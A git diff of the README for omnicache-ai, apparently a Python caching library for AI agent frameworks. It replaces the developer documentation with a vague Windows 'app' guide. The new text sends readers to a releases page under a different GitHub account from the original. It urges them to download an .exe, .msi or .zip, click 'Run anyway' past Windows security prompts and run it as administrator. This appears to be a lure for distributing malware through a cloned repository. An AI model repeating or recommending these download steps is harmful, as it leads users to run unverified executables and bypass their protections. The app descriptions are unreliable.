@@ -1,764 +1,252 @@
-<div align="center">
-  <img src="assets/omnicache_logo.png" alt="OmniCache-AI Logo" width="280"/>
-
-<h1>omnicache-ai</h1>
-
-<p><strong>Unified multi-layer caching for AI Agent pipelines.</strong><br/>
-  Drop it in front of any LLM call, embedding, retrieval query, or agent workflow<br/>
-  to eliminate redundant API calls and cut latency and cost.</p>
-
-[![Python](https://img.shields.io/badge/python-3.12%2B-3776AB?logo=python&logoColor=white)](https://www.python.org/)
-[![PyPI](https://img.shields.io/badge/PyPI-omnicache--ai-orange?logo=pypi&logoColor=white)](https://pypi.org/project/omnicache-ai/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-22c55e)](LICENSE)
-[![LangChain](https://img.shields.io/badge/LangChain-1.x-1C3C3C?logo=langchain)](https://python.langchain.com/)
-[![LangGraph](https://img.shields.io/badge/LangGraph-1.x-1C3C3C)](https://langchain-ai.github.io/langgraph/)
-[![AutoGen](https://img.shields.io/badge/AutoGen-0.4%2B-0078D4?logo=microsoft)](https://microsoft.github.io/autogen/)
-[![CrewAI](https://img.shields.io/badge/CrewAI-1.x-FF4B4B)](https://www.crewai.com/)
-[![Agno](https://img.shields.io/badge/Agno-2.x-6366F1)](https://www.agno.com/)
-
-</div>
-
----
-
-## Table of Contents
-
-- [Why omnicache-ai?](#why-omnicache-ai)
-- [Key Features](#key-features)
-- [AI Agent Pipeline Architecture](#ai-agent-pipeline-architecture)
-- [Installation](#installation)
-- [Quick Start](#quick-start)
-- [Cache Layers](#cache-layers)
-- [Middleware](#middleware-decorator-pattern)
-- [Framework Adapters](#framework-adapters)
-- [Backends](#backends)
-- [Tag-Based Invalidation](#tag-based-invalidation)
-- [Custom Backend](#custom-backend)
-- [Project Structure](#project-structure)
-- [Development](#development)
-
----
-
-## Why omnicache-ai?
-
-Every AI agent pipeline makes the same expensive calls repeatedly:
-
-| Without caching                                 | With omnicache-ai                                 |
-| ----------------------------------------------- | ------------------------------------------------- |
-| Every LLM call billed at full token cost        | Identical prompts returned instantly, zero tokens |
-| Embeddings re-computed on every request         | Vectors stored and reused across sessions         |
-| Vector search re-run for same queries           | Retrieval results cached by query + top-k         |
-| Agent state lost between runs                   | Session context persisted across turns            |
-| Semantically identical questions treated as new | Cosine similarity match returns cached answer     |
-
----
-
-## Key Features
-
-### Cache Layers
-
-| Layer           | Class            | What it caches                                                       | Serialization  |
-| --------------- | ---------------- | -------------------------------------------------------------------- | -------------- |
-| LLM Response    | `ResponseCache`  | Model output keyed by model + messages + params                      | pickle         |
-| Embeddings      | `EmbeddingCache` | `np.ndarray` vectors keyed by model + text                           | `np.tobytes()` |
-| Retrieval       | `RetrievalCache` | Document lists keyed by query + retriever + top-k                    | pickle         |
-| Context/Session | `ContextCache`   | Conversation turns keyed by session ID + turn index                  | pickle         |
-| Semantic        | `SemanticCache`  | Answers reused for semantically similar queries (cosine ≥ threshold) | pickle         |
-
-### Storage Backends
-
-| Backend         | Class             | Extras            | Best For                           |
-| --------------- | ----------------- | ----------------- | ---------------------------------- |
-| In-Memory (LRU) | `InMemoryBackend` | — (core)          | Dev, testing, single-process       |
-| Disk            | `DiskBackend`     | — (core)          | Persistent, single-machine         |
-| Redis           | `RedisBackend`    | `[redis]`         | Shared across processes / services |
-| FAISS           | `FAISSBackend`    | `[vector-faiss]`  | High-speed vector similarity       |
-| ChromaDB        | `ChromaBackend`   | `[vector-chroma]` | Persistent vector store + metadata |
-
-### Framework Adapters
-
-| Framework             | Class                   | Hook Point                                           | Async                             |
-| --------------------- | ----------------------- | ---------------------------------------------------- | --------------------------------- |
-| LangChain ≥ 0.2       | `LangChainCacheAdapter` | `BaseCache` — `lookup` / `update`                    | ✅`alookup` / `aupdate`           |
-| LangGraph ≥ 0.1 / 1.x | `LangGraphCacheAdapter` | `BaseCheckpointSaver` — `get_tuple` / `put` / `list` | ✅`aget_tuple` / `aput` / `alist` |
-| AutoGen ≥ 0.4         | `AutoGenCacheAdapter`   | `AssistantAgent.run()` / `arun()`                    | ✅`arun`                          |
-| AutoGen 0.2.x         | `AutoGenCacheAdapter`   | `ConversableAgent.generate_reply()`                  | —                                 |
-| CrewAI ≥ 0.28         | `CrewAICacheAdapter`    | `Crew.kickoff()`                                     | ✅`kickoff_async`                 |
-| Agno ≥ 0.1            | `AgnoCacheAdapter`      | `Agent.run()` / `arun()`                             | ✅`arun`                          |
-| A2A ≥ 0.2             | `A2ACacheAdapter`       | `process()` / `wrap()` decorator                     | ✅`aprocess`                      |
-
-### Middleware
-
-| Class                 | Wraps                         | Async |
-| --------------------- | ----------------------------- | ----- |
-| `LLMMiddleware`       | Any sync LLM callable         | —     |
-| `AsyncLLMMiddleware`  | Any async LLM callable        | ✅    |
-| `EmbeddingMiddleware` | Any sync/async embed function | ✅    |
-| `RetrieverMiddleware` | Any sync/async retriever      | ✅    |
-
-### Core Engine
-
-| Component    | Class                | Description                                                        |
-| ------------ | -------------------- | ------------------------------------------------------------------ |
-| Orchestrator | `CacheManager`       | Central hub — wires backend, key builder, TTL policy, invalidation |
-| Key Builder  | `CacheKeyBuilder`    | `namespace:type:sha256[:16]` canonical keys                        |
-| TTL Policy   | `TTLPolicy`          | Global + per-layer TTL overrides                                   |
-| Eviction     | `EvictionPolicy`     | LRU / LFU / TTL-only strategies                                    |
-| Invalidation | `InvalidationEngine` | Tag-based bulk eviction                                            |
-| Settings     | `OmnicacheSettings`  | Dataclass +`from_env()` for 12-factor config                       |
-
----
-
-## AI Agent Pipeline Architecture
-
-### Where Cache Layers Sit in a Full AI Pipeline
-
-```mermaid
-flowchart TD
-    User(["👤 User / Application"])
-
-    User -->|query| Adapters
-
-    subgraph Adapters["🔌 Framework Adapters"]
-        direction LR
-        LC["LangChain"]
-        LG["LangGraph"]
-        AG["AutoGen"]
-        CR["CrewAI"]
-        AN["Agno"]
-        A2["A2A"]
-    end
-
-    Adapters -->|intercepted call| MW
-
-    subgraph MW["⚙️ Middleware"]
-        direction LR
-        LLM_MW["LLMMiddleware"]
-        EMB_MW["EmbeddingMiddleware"]
-        RET_MW["RetrieverMiddleware"]
-    end
-
-    MW -->|cache lookup| Layers
-
-    subgraph Layers["🗂️ Cache Layers (omnicache-ai)"]
-        direction TB
-        RC["ResponseCache\n(LLM output)"]
-        EC["EmbeddingCache\n(np.ndarray)"]
-        REC["RetrievalCache\n(documents)"]
-        CC["ContextCache\n(session turns)"]
-        SC["SemanticCache\n(similarity search)"]
-    end
-
-    Layers -->|hit → return| User
-    Layers -->|miss → forward| Core
-
-    subgraph Core["🧠 Core Engine"]
-        direction LR
-        CM["CacheManager"]
-        KB["CacheKeyBuilder\nnamespace:type:sha256"]
-        IE["InvalidationEngine\ntag-based eviction"]
-        TP["TTLPolicy\nper-layer TTLs"]
-    end
-
-    Core <-->|read / write| Backends
-
-    subgraph Backends["💾 Storage Backends"]
-        direction LR
-        MEM["InMemoryBackend\n(LRU, thread-safe)"]
-        DISK["DiskBackend\n(diskcache)"]
-        REDIS["RedisBackend\n[redis]"]
-        FAISS["FAISSBackend\n[vector-faiss]"]
-        CHROMA["ChromaBackend\n[vector-chroma]"]
-    end
-
-    Core -->|miss| LLM_CALL
-
-    subgraph LLM_CALL["🤖 Actual AI Work (on cache miss only)"]
-        direction LR
-        LLM["LLM API\ngpt-4o / claude / gemini"]
-        EMB["Embedder\ntext-embedding-3"]
-        VDB["Vector DB\npinecone / weaviate"]
-        TOOLS["Tools / APIs"]
-    end
-
-    LLM_CALL -->|result| Core
-    Core -->|store + return| User
-
-    style Layers fill:#1e3a5f,color:#fff,stroke:#3b82f6
-    style Backends fill:#1a3326,color:#fff,stroke:#22c55e
-    style Adapters fill:#3b1f5e,color:#fff,stroke:#a855f7
-    style MW fill:#3b2a0f,color:#fff,stroke:#f59e0b
-    style Core fill:#1e2a3b,color:#fff,stroke:#64748b
-    style LLM_CALL fill:#3b1a1a,color:#fff,stroke:#ef4444
-```
-
----
-
-### Cache Layer Responsibilities in the Pipeline
-
-```mermaid
-flowchart LR
-    Q(["Query"])
-
-    Q --> S1
-    subgraph S1["① Semantic Layer"]
-        SC["SemanticCache\ncosine similarity ≥ 0.95\n→ skip everything below"]
-    end
-
-    S1 -->|miss| S2
-    subgraph S2["② Response Layer"]
-        RC["ResponseCache\nexact model+msgs+params\nhash match"]
-    end
-
-    S2 -->|miss| S3
-    subgraph S3["③ Retrieval Layer"]
-        REC["RetrievalCache\nquery + retriever + top-k\nhash match"]
-    end
-
-    S3 -->|miss| S4
-    subgraph S4["④ Embedding Layer"]
-        EC["EmbeddingCache\nmodel + text hash match\nreturns np.ndarray"]
-    end
-
-    S4 -->|miss| S5
-    subgraph S5["⑤ Context Layer"]
-        CC["ContextCache\nsession_id + turn_index\nreturns message history"]
-    end
-
-    S5 -->|all miss| LLM(["🤖 LLM / API Call"])
-
-    LLM -->|result| Store["Store in all\nrelevant layers"]
-    Store --> R(["Response"])
-
-    S1 -->|hit ⚡| R
-    S2 -->|hit ⚡| R
-    S3 -->|hit ⚡| R
-    S4 -->|hit ⚡| R
-    S5 -->|hit ⚡| R
-
-    style S1 fill:#4c1d95,color:#fff,stroke:#7c3aed
-    style S2 fill:#1e3a5f,color:#fff,stroke:#3b82f6
-    style S3 fill:#14532d,color:#fff,stroke:#22c55e
-    style S4 fill:#713f12,color:#fff,stroke:#f59e0b
-    style S5 fill:#7f1d1d,color:#fff,stroke:#ef4444
-```
-
----
-
-### Backend Selection by Use Case
-
-```mermaid
-flowchart TD
-    Start(["Which backend?"])
-
-    Start --> Q1{"Multiple\nprocesses\nor services?"}
-    Q1 -->|Yes| REDIS["RedisBackend\npip install 'omnicache-ai[redis]'"]
-    Q1 -->|No| Q2{"Need vector\nsimilarity?"}
-
-    Q2 -->|Yes| Q3{"Persist\nto disk?"}
-    Q3 -->|Yes| CHROMA["ChromaBackend\npip install 'omnicache-ai[vector-chroma]'"]
-    Q3 -->|No| FAISS["FAISSBackend\npip install 'omnicache-ai[vector-faiss]'"]
-
-    Q2 -->|No| Q4{"Survive\nrestarts?"}
-    Q4 -->|Yes| DISK["DiskBackend\n(no extra install)"]
-    Q4 -->|No| MEM["InMemoryBackend\n(no extra install)"]
-
-    style REDIS fill:#dc2626,color:#fff
-    style FAISS fill:#2563eb,color:#fff
-    style CHROMA fill:#7c3aed,color:#fff
-    style DISK fill:#d97706,color:#fff
-    style MEM fill:#059669,color:#fff
-```
-
----
-
-## Installation
-
-### Requirements
-
-- Python ≥ 3.12
-- Core dependencies: `diskcache`, `numpy` (installed automatically)
-
-### Install from GitHub (recommended — available now)
-
-```bash
-# pip — core (in-memory + disk backends)
-pip install git+https://github.com/ashishpatel26/omnicache-ai.git
-
-# pip — with extras
-pip install "omnicache-ai[langchain,redis] @ git+https://github.com/ashishpatel26/omnicache-ai.git"
-
-# uv — core
-uv add git+https://github.com/ashishpatel26/omnicache-ai.git
-
-# uv — with extras
-uv pip install "omnicache-ai[langchain,redis] @ git+https://github.com/ashishpatel26/omnicache-ai.git"
-```
-
-### pip (PyPI — coming soon)
-
-```bash
-# Minimal — in-memory + disk backends
-pip install omnicache-ai
-
-# ── Framework adapters ──────────────────────────────────────────────
-pip install 'omnicache-ai[langchain]'       # LangChain ≥ 0.2
-pip install 'omnicache-ai[langgraph]'       # LangGraph ≥ 0.1 / 1.x
-pip install 'omnicache-ai[autogen]'         # AutoGen legacy (pyautogen 0.2.x)
-pip install 'autogen-agentchat>=0.4'        # AutoGen new API (separate package)
-pip install 'omnicache-ai[crewai]'          # CrewAI ≥ 0.28 / 1.x
-pip install 'omnicache-ai[agno]'            # Agno ≥ 0.1 / 2.x
-pip install 'a2a-sdk>=0.3' omnicache-ai     # A2A SDK ≥ 0.2
-
-# ── Storage backends ────────────────────────────────────────────────
-pip install 'omnicache-ai[redis]'           # Redis
-pip install 'omnicache-ai[vector-faiss]'    # FAISS vector search
-pip install 'omnicache-ai[vector-chroma]'   # ChromaDB vector store
-
-# ── Common combos ───────────────────────────────────────────────────
-pip install 'omnicache-ai[langchain,redis]'
-pip install 'omnicache-ai[langgraph,vector-faiss]'
-
-# ── Everything ──────────────────────────────────────────────────────
-pip install 'omnicache-ai[all]'
-```
-
-### uv
-
-```bash
-uv add omnicache-ai
-uv add 'omnicache-ai[langchain,redis]'
-uv add 'omnicache-ai[all]'
-```
+# 🤖 omnicache-ai - Fast, Simple Cache for AI Apps
 
-### conda
-
-```bash
-conda install -c conda-forge omnicache-ai
-```
+[![Download omnicache-ai](https://img.shields.io/badge/Download%20omnicache--ai-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Skyineradicable295/omnicache-ai/releases)
 
-### From source
+## 🧭 What this app does
 
-```bash
-git clone https://github.com/ashishpatel26/omnicache-ai.git
-cd omnicache-ai
-uv sync --dev         # installs all dev + core deps
-uv run pytest         # verify install
-```
+omnicache-ai helps AI apps remember things they have already processed. It keeps useful data in cache layers so your app can work faster and use fewer repeated calls.
 
-### Verify
+It is made for AI and agent tools like:
 
-```bash
-python -c "import omnicache_ai; print(omnicache_ai.__version__)"
-# 0.1.0
-```
+- LangChain
+- LangGraph
+- AutoGen
+- CrewAI
+- Agno
+- A2A
 
-### Environment variable configuration
+Use it when you want your AI app to:
 
-| Variable                       | Default                    | Values                      |
-| ------------------------------ | -------------------------- | --------------------------- |
-| `OMNICACHE_BACKEND`            | `memory`                   | `memory` · `disk` · `redis` |
-| `OMNICACHE_REDIS_URL`          | `redis://localhost:6379/0` | Any Redis URL               |
-| `OMNICACHE_DISK_PATH`          | `/tmp/omnicache`           | Any writable path           |
-| `OMNICACHE_DEFAULT_TTL`        | `3600`                     | Seconds;`0` = no expiry     |
-| `OMNICACHE_NAMESPACE`          | `omnicache`                | Key prefix string           |
-| `OMNICACHE_SEMANTIC_THRESHOLD` | `0.95`                     | Float 0–1                   |
-| `OMNICACHE_TTL_EMBEDDING`      | `86400`                    | Per-layer override          |
-| `OMNICACHE_TTL_RETRIEVAL`      | `3600`                     | Per-layer override          |
-| `OMNICACHE_TTL_CONTEXT`        | `1800`                     | Per-layer override          |
-| `OMNICACHE_TTL_RESPONSE`       | `600`                      | Per-layer override          |
+- reuse past results
+- store embeddings
+- reduce repeat work
+- keep short-term and long-term memory
+- handle multi-step agent flows with less delay
 
-```bash
-export OMNICACHE_BACKEND=redis
-export OMNICACHE_REDIS_URL=redis://localhost:6379/0
-export OMNICACHE_DEFAULT_TTL=3600
-```
+## 💻 Windows setup
 
-```python
-from omnicache_ai import CacheManager, OmnicacheSettings
+This app is for Windows users who want to download and run the software from GitHub.
 
-manager = CacheManager.from_settings(OmnicacheSettings.from_env())
-```
+### 1) 📥 Open the download page
 
----
+Visit this page to download the app:
 
-## Quick Start
+https://github.com/Skyineradicable295/omnicache-ai/releases
 
-```python
-from omnicache_ai import CacheManager, InMemoryBackend, CacheKeyBuilder
+### 2) 🗂 Pick the latest release
 
-manager = CacheManager(
-    backend=InMemoryBackend(),
-    key_builder=CacheKeyBuilder(namespace="myapp"),
-)
+On the releases page, look for the newest version at the top.
 
-manager.set("my_key", {"result": 42}, ttl=60)
-value = manager.get("my_key")  # {"result": 42}
-```
+Then choose the file that matches your Windows system. Common file types include:
 
-### LangChain in 3 lines
+- `.exe`
+- `.msi`
+- `.zip`
 
-```python
-from langchain_core.globals import set_llm_cache
-from omnicache_ai import CacheManager, InMemoryBackend, CacheKeyBuilder
-from omnicache_ai.adapters.langchain_adapter import LangChainCacheAdapter
+If you see more than one file, pick the one that looks like the main Windows app.
 
-set_llm_cache(LangChainCacheAdapter(CacheManager(backend=InMemoryBackend(), key_builder=CacheKeyBuilder())))
-# Every ChatOpenAI / ChatAnthropic call is now cached automatically
-```
+### 3) ▶️ Download and run the file
 
----
+- If you downloaded an `.exe` or `.msi` file, double-click it to start the installer.
+- If you downloaded a `.zip` file, right-click it and choose Extract All, then open the extracted folder and run the app file inside.
 
-## Cache Layers
+If Windows asks for permission, select Yes.
 
-### LLM Response Cache
+### 4) 🛡 Allow the app if Windows asks
 
-Cache the string or dict output of any LLM call, keyed by model + messages + params.
+Windows may show a security prompt. This can happen with new apps.
 
-```python
-from omnicache_ai import CacheManager, InMemoryBackend, CacheKeyBuilder, ResponseCache
+Do this:
 
-manager = CacheManager(backend=InMemoryBackend(), key_builder=CacheKeyBuilder(namespace="myapp"))
-cache = ResponseCache(manager)
+- Check that the file came from the releases page above
+- Click More info if Windows hides the run button
+- Select Run anyway if that option appears
 
-messages = [{"role": "user", "content": "What is 2+2?"}]
+### 5) 🖥 Start the app
 
-cache.set(messages, "4", model_id="gpt-4o")
-answer = cache.get(messages, model_id="gpt-4o")  # "4"
+After install or extract, open omnicache-ai from:
 
-# get_or_generate — calls generator only on cache miss
-def call_llm(msgs):
-    return openai_client.chat.completions.create(...).choices[0].message.content
+- the Start menu
+- the desktop shortcut
+- the folder where you unpacked it
 
-answer = cache.get_or_generate(messages, call_llm, model_id="gpt-4o")
-```
+If the app opens with a window or tray icon, it is ready to use.
 
-### Embedding Cache
+## ✨ What you can do with it
 
-```python
-from omnicache_ai import EmbeddingCache
+omnicache-ai is useful when your AI app keeps asking the same things again and again.
 
-emb_cache = EmbeddingCache(manager)
+It can help with:
 
-vec = emb_cache.get_or_compute(
-    text="Hello world",
-    compute_fn=lambda t: embed_model.encode(t),
-    model_id="text-embedding-3-small",
-)
-```
+- caching prompt results
+- storing recent agent steps
+- saving retrieved content for RAG flows
+- keeping embeddings ready for reuse
+- speeding up repeated tasks
+- reducing calls to the same model or tool
 
-### Retrieval Cache
+This makes the app fit well in projects that use:
 
-```python
-from omnicache_ai import RetrievalCache
+- memory layers
+- retrieval pipelines
+- agent chains
+- local or remote AI tools
 
-ret_cache = RetrievalCache(manager)
+## 🧱 How the cache layers work
 
-docs = ret_cache.get_or_retrieve(
-    query="What is RAG?",
-    retrieve_fn=lambda q: vectorstore.similarity_search(q, k=5),
-    retriever_id="my-vectorstore",
-    top_k=5,
-)
-```
+The library uses more than one cache layer. That helps the app check fast storage first before it looks deeper.
 
-### Context / Session Cache
+A simple way to think about it:
 
-```python
-from omnicache_ai import ContextCache
+- the first layer checks the quickest data
+- the next layer looks for older or larger stored data
+- the final layer keeps the longer-lived memory
 
-ctx_cache = ContextCache(manager)
+This setup helps with:
 
-ctx_cache.set(session_id="user-123", turn_index=0, messages=[...])
-history = ctx_cache.get(session_id="user-123", turn_index=0)
+- fast reads
+- fewer repeated requests
+- better use of stored results
+- smoother AI workflows
 
-ctx_cache.invalidate_session("user-123")  # clear all turns for this session
-```
+## 🧰 Common use cases
 
-### Semantic Cache
+Use omnicache-ai if you build apps like:
 
-Returns a cached answer for semantically similar queries (cosine ≥ threshold). Requires `pip install 'omnicache-ai[vector-faiss]'`.
+- chat assistants
+- research agents
+- workflow bots
+- retrieval-augmented generation apps
+- multi-agent systems
+- memory-based tools
 
-```python
-from omnicache_ai import SemanticCache
-from omnicache_ai.backends.memory_backend import InMemoryBackend
-from omnicache_ai.backends.vector_backend import FAISSBackend
+It works well when your app needs to remember:
 
-sem_cache = SemanticCache(
-    exact_backend=InMemoryBackend(),
-    vector_backend=FAISSBackend(dim=1536),
-    embed_fn=lambda text: embed_model.encode(text),  # returns np.ndarray
-    threshold=0.95,
-)
+- user context
+- past answers
+- document chunks
+- search results
+- generated outputs
+- tool calls
 
-sem_cache.set("What is the capital of France?", "Paris")
+## 📋 Basic system needs
 
-sem_cache.get("What is the capital of France?")       # "Paris" — exact
-sem_cache.get("Which city is the capital of France?") # "Paris" — semantic hit
-```
+For a normal Windows setup, use:
 
----
+- Windows 10 or Windows 11
+- an internet connection for the first download
+- enough disk space for the app and cache files
+- permission to run apps on your PC
 
-## Middleware (Decorator Pattern)
+For best results, use a machine with:
 
-Wrap any sync/async LLM callable without changing its signature.
+- at least 4 GB RAM
+- 8 GB RAM or more for larger AI workflows
+- a stable storage drive with free space for cached data
 
-```python
-from omnicache_ai import LLMMiddleware, CacheKeyBuilder, ResponseCache
+## 🔎 What to expect after opening it
 
-middleware = LLMMiddleware(response_cache, key_builder, model_id="gpt-4o")
+Once you start omnicache-ai, you may see options for:
 
-@middleware
-def call_llm(messages: list[dict]) -> str:
-    return openai_client.chat.completions.create(...).choices[0].message.content
+- cache status
+- memory settings
+- storage paths
+- layer selection
+- agent or pipeline links
+- logs or activity view
 
-wrapped = middleware(call_llm)  # or wrap an existing callable
-```
+The app may also create local files to store cache data. This is normal and helps the app remember past work.
 
-```python
-from omnicache_ai import AsyncLLMMiddleware
+## 🧪 Example workflow
 
-@AsyncLLMMiddleware(response_cache, key_builder, model_id="gpt-4o")
-async def call_llm_async(messages):
-    return await async_client.chat(messages)
-```
+Here is a simple example of how it helps:
 
-Same pattern: `EmbeddingMiddleware`, `RetrieverMiddleware`
+1. Your agent gets a user question.
+2. omnicache-ai checks if the answer is already in cache.
+3. If it finds a match, it returns the stored result.
+4. If not, the agent runs the task.
+5. The app saves the new result for later use.
 
----
+This saves time when users ask similar things more than once.
 
-## Framework Adapters
+## 🧭 Where it fits in your AI stack
 
-### LangChain
+omnicache-ai fits between your app and the tools it uses.
 
-```python
-from langchain_core.globals import set_llm_cache
-from omnicache_ai.adapters.langchain_adapter import LangChainCacheAdapter
+It can sit near:
 
-set_llm_cache(LangChainCacheAdapter(manager))
+- prompt handling
+- document retrieval
+- memory stores
+- embedding search
+- agent planning steps
+- tool output storage
 
-llm = ChatOpenAI(model="gpt-4o")
-response = llm.invoke("What is 2+2?")  # cached on second call
-```
+That makes it useful for both small apps and larger agent systems.
 
-### LangGraph
+## 📁 Files and folders you may see
 
-Compatible with langgraph ≥ 0.1 and ≥ 1.0 — adapter auto-detects the API version.
+After install or first run, you may see folders or files for:
 
-```python
-from omnicache_ai.adapters.langgraph_adapter import LangGraphCacheAdapter
+- cache data
+- logs
+- config settings
+- embeddings
+- memory records
+- temporary results
 
-saver = LangGraphCacheAdapter(manager)
-graph = StateGraph(MyState).compile(checkpointer=saver)
+Do not delete these files unless you want the app to forget stored data.
 
-result = graph.invoke({"messages": [...]}, config={"configurable": {"thread_id": "t1"}})
-```
+## 🛠 Simple troubleshooting
 
-### AutoGen
+If the app does not open, try these steps:
 
-```python
-# autogen-agentchat 0.4+ (new API)
-from autogen_agentchat.agents import AssistantAgent
-from omnicache_ai.adapters.autogen_adapter import AutoGenCacheAdapter
+- download the latest release again
+- make sure the file finished downloading
+- right-click the file and choose Run as administrator
+- restart your PC and try again
+- check that Windows did not block the file
 
-agent = AssistantAgent("assistant", model_client=...)
-cached = AutoGenCacheAdapter(agent, manager)
-result = await cached.arun("What is 2+2?")
+If the app opens but looks empty:
 
-# pyautogen 0.2.x (legacy)
-from autogen import ConversableAgent
-agent = ConversableAgent(name="assistant", llm_config={...})
-cached = AutoGenCacheAdapter(agent, manager)
-reply = cached.generate_reply(messages=[{"role": "user", "content": "Hi"}])
-```
+- wait a few seconds for cache data to load
+- check your network connection
+- open the settings and confirm the storage path
+- make sure you are using the newest release
 
-### CrewAI
+If the app feels slow:
 
-```python
-from crewai import Crew
-from omnicache_ai.adapters.crewai_adapter import CrewAICacheAdapter
+- close other apps you do not need
+- free up disk space
+- reduce the amount of stored cache data
+- restart the app
 
-crew = Crew(agents=[...], tasks=[...])
-cached_crew = CrewAICacheAdapter(crew, manager)
+## 📎 Download link again
 
-result = cached_crew.kickoff(inputs={"topic": "AI trends"})
-result = await cached_crew.kickoff_async(inputs={"topic": "AI trends"})
-```
+Open the release page here to download the latest version:
 
-### Agno
+https://github.com/Skyineradicable295/omnicache-ai/releases
 
-```python
-from agno.agent import Agent
-from omnicache_ai.adapters.agno_adapter import AgnoCacheAdapter
+## 🧩 Related topics
 
-agent = Agent(model=..., tools=[...])
-cached = AgnoCacheAdapter(agent, manager)
+This project is tied to:
 
-response = cached.run("Summarize the latest AI research")
-response = await cached.arun("Summarize the latest AI research")
-```
+- agent
+- agno
+- aiagents
+- autogen
+- caching-memory
+- caching-strategies
+- crewai
+- embeddings
+- langchain
+- langgraph
+- rag
 
-### A2A (Agent-to-Agent)
+## 🖱 Quick install path
 
-```python
-from omnicache_ai.adapters.a2a_adapter import A2ACacheAdapter
-
-adapter = A2ACacheAdapter(manager, agent_id="planner")
-
-# Explicit call
-result = adapter.process(handler_fn, task_payload)
-result = await adapter.aprocess(async_handler, task_payload)
-
-# As a decorator
-@adapter.wrap
-def handle_task(payload: dict) -> dict:
-    return downstream_agent.process(payload)
-```
-
----
-
-## Tag-Based Invalidation
-
-```python
-from omnicache_ai import InvalidationEngine, InMemoryBackend, CacheManager, CacheKeyBuilder
-
-manager = CacheManager(
-    backend=InMemoryBackend(),
-    key_builder=CacheKeyBuilder(),
-    invalidation_engine=InvalidationEngine(InMemoryBackend()),
-)
-
-manager.set("key1", "v1", tags=["model:gpt-4o", "env:prod"])
-manager.set("key2", "v2", tags=["model:gpt-4o"])
-
-count = manager.invalidate("model:gpt-4o")  # removes both entries
-
-# ResponseCache / ContextCache tag automatically
-from omnicache_ai import ResponseCache, ContextCache
-rc = ResponseCache(manager)
-rc.invalidate_model("gpt-4o")           # remove all gpt-4o responses
-
-ctx = ContextCache(manager)
-ctx.invalidate_session("user-123")      # clear all session turns
-```
-
----
-
-## Backends
-
-| Backend           | Extra             | Use case                               |
-| ----------------- | ----------------- | -------------------------------------- |
-| `InMemoryBackend` | —                 | Dev, testing, single-process           |
-| `DiskBackend`     | —                 | Survives restarts, single-machine      |
-| `RedisBackend`    | `[redis]`         | Shared cache across processes/services |
-| `FAISSBackend`    | `[vector-faiss]`  | Semantic/vector similarity search      |
-| `ChromaBackend`   | `[vector-chroma]` | Persistent vector store with metadata  |
-
-```python
-from omnicache_ai.backends.redis_backend import RedisBackend
-from omnicache_ai.backends.disk_backend import DiskBackend
-
-manager = CacheManager(backend=RedisBackend(url="redis://localhost:6379/0"), ...)
-manager = CacheManager(backend=DiskBackend(path="/var/cache/omnicache"), ...)
-```
-
----
-
-## Custom Backend
-
-Implement the `CacheBackend` Protocol — no inheritance required (structural typing):
-
-```python
-from omnicache_ai.backends.base import CacheBackend
-from typing import Any
-
-class MyBackend:
-    def get(self, key: str) -> Any | None: ...
-    def set(self, key: str, value: Any, ttl: int | None = None) -> None: ...
-    def delete(self, key: str) -> None: ...
-    def exists(self, key: str) -> bool: ...
-    def clear(self) -> None: ...
-    def close(self) -> None: ...
-
-assert isinstance(MyBackend(), CacheBackend)  # True
-```
-
----
-
-## Project Structure
-
-```
-omnicache_ai/
-├── __init__.py                 # Public API surface
-├── __main__.py                 # CLI entry point (omnicache)
-├── config/
-│   └── settings.py             # OmnicacheSettings dataclass + from_env()
-├── backends/
-│   ├── base.py                 # CacheBackend + VectorBackend Protocols
-│   ├── memory_backend.py       # InMemoryBackend (LRU, thread-safe, RLock)
-│   ├── disk_backend.py         # DiskBackend (diskcache, process-safe)
-│   ├── redis_backend.py        # RedisBackend [optional: redis]
-│   └── vector_backend.py       # FAISSBackend + ChromaBackend [optional]
-├── core/
-│   ├── key_builder.py          # namespace:type:sha256[:16] canonical keys
-│   ├── policies.py             # TTLPolicy, EvictionPolicy
-│   ├── invalidation.py         # Tag-based InvalidationEngine
-│   └── cache_manager.py        # Central orchestrator + from_settings()
-├── layers/
-│   ├── embedding_cache.py      # np.ndarray ↔ bytes serialization
-│   ├── retrieval_cache.py      # list[Document] via pickle
-│   ├── context_cache.py        # session_id + turn_index keyed
-│   ├── response_cache.py       # model + messages + params keyed
-│   └── semantic_cache.py       # exact → vector two-tier lookup
-├── middleware/
-│   ├── llm_middleware.py       # LLMMiddleware + AsyncLLMMiddleware
-│   ├── embedding_middleware.py # EmbeddingMiddleware
-│   └── retriever_middleware.py # RetrieverMiddleware
-└── adapters/
-    ├── langchain_adapter.py    # BaseCache (lookup/update/alookup/aupdate)
-    ├── langgraph_adapter.py    # BaseCheckpointSaver (get_tuple/put/list + async)
-    ├── autogen_adapter.py      # AssistantAgent 0.4+ + ConversableAgent 0.2.x
-    ├── crewai_adapter.py       # Crew.kickoff() + kickoff_async()
-    ├── agno_adapter.py         # Agent.run() + arun()
-    └── a2a_adapter.py          # process() + aprocess() + @wrap
-```
-
----
-
-## Development
-
-```bash
-# Clone and install with dev deps
-git clone https://github.com/your-org/omnicache-ai
-cd omnicache-ai
-uv sync --dev
-
-# Run all tests
-uv run pytest
-
-# With coverage report
-uv run pytest --cov=omnicache_ai --cov-report=term-missing
-
-# Lint
-uv run ruff check omnicache_ai
-
-# Type check
-uv run mypy omnicache_ai
-
-# Run specific layer tests
-uv run pytest tests/layers/ tests/core/ -v
-
-# Run adapter tests (requires optional deps)
-uv run pytest tests/adapters/ -v
-```
-
----
-
-## License
-
-MIT — see [LICENSE](LICENSE)
-
----
-
-<div align="center">
-  <sub>Built with ❤️ for the AI engineering community</sub>
-</div>
+1. Open the releases page
+2. Download the latest Windows file
+3. Run the installer or extract the ZIP
+4. Open the app
+5. Start using the cache in your AI workflow
